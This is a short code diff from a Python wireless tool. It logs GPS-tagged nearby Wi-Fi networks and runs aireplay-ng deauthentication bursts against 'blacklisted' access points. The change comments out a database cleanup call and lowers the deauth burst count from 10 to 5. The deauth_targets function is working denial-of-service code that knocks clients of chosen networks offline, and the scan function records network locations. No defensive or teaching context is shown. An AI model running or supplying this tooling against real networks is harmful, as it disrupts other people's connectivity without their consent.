@@ -70,7 +70,7 @@ def scan(netdb, interface, loopscan):
                 print("Scanres = ", scanres)
                 noresults = False
         gpsdata = getlocation('/dev/ttyUSB1') #Change this to the GPS port
-        netdb.mark_inactive()
+        #netdb.mark_inactive()
         for bssid in wifi.tree:
             netdb.adddevice(bssid, wifi.tree[bssid]['ESSID'], wifi.tree[bssid]['Power'], 
                 wifi.tree[bssid]['channel'], wifi.tree[bssid]['Privacy'])
@@ -124,7 +124,7 @@ def deauth_targets(netdb, wifi, deauth_loop):
             logging.debug("Blacklisting: " + bssid['bssid']  + " on channel " + channel)
             #Set channel on device
             call(["iwconfig",  wifi, "channel", channel])
-            call(["aireplay-ng", "-0", "10", "-a", bssid['bssid'], wifi])
+            call(["aireplay-ng", "-0", "5", "-a", bssid['bssid'], wifi])
             foundpairs = True
         logging.debug("Dauth targets completed")
         if (foundpairs != True):
